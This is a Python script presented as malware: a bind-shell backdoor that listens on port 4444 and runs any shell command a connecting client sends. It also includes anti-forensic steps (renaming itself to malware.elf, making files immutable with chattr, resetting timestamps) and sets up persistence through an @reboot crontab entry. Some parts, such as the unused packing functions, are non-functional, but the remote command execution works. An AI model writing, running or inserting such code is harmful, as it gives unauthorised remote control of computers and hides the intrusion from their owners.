import os
import socket
import subprocess
import time
import base64
import zlib

# Backdoor parameters
host = '192.168.1.100'  # Replace with the target IP address
port = 4444             # Replace with the desired port number

# Create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to the host and port
s.bind((host, port))

# Listen for incoming connections
s.listen(1)

print(f"Backdoor created on {host}:{port}")

# Anti-forensics
# Rename the current process
script_path = os.path.abspath(__file__)
os.system(f'mv "{script_path}" malware.elf')

# Hide files
os.system('chattr +i *')

# Modify timestamps
for file in os.listdir():
    os.utime(file, (time.time(), time.time()))

# Persistence
# Detect the OS
if os.name == 'posix':  # Linux
    os_name = 'linux'
    os.system('(crontab -l 2>/dev/null; echo "@reboot malware.elf") | crontab -')

def pack_code(code):
    # Pack the code using zlib compression
    compressed_code = zlib.compress(code.encode())
    return base64.b64encode(compressed_code).decode()

def unpack_code(packed_code):
    # Unpack the code using zlib decompression
    decoded_code = base64.b64decode(packed_code.encode())
    code = zlib.decompress(decoded_code).decode()
    return code

while True:
    # Accept client connections
    client_socket, address = s.accept()
    print(f"Connection from {address}")

    while True:
        # Receive plain text commands from the client
        command = client_socket.recv(1024).decode()

        if command.lower() == 'quit':
            # Close the client connection and exit the loop
            client_socket.close()
            break

        # Execute the received command
        output = subprocess.run(command, shell=True, capture_output=True)

        # Send the output back to the client
        client_socket.send(output.stdout)

# Close the server socket
s.close()